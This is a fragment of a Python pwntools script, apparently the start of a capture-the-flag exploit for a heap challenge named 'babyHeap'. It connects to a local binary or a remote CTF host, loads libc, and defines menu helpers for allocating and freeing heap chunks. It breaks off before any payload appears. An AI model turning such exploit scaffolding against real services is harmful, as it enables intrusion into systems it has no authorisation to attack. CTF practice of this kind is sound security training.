from pwn import *

BEDUG = True

if BEDUG:
    io = process('./babyHeap')
    libc  = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('hack.scythe2021.sdslabs.co', 17169)
    libc = ELF('./libc-2.31.so')

def add(chunk_num, size):
    print(io.recvuntil(b'>> '))
    io.sendline(b'1')
    print(io.recvuntil(b'How many chunks do you wanna allocate: '))
    io.sendline(str(chunk_num).encode('utf-8'))
    print(io.recvuntil(b'>> '))
    if size == b'small':
        io.sendline(str(3).encode('utf-8'))
    elif size == b'medium':
        io.sendline(str(2).encode('utf-8'))
    elif size == b'large':
        io.sendline(str(1).encode('utf-8'))

def free():
    print(io.recvuntil(b'>> '))
    io.sendline(b'2')

def 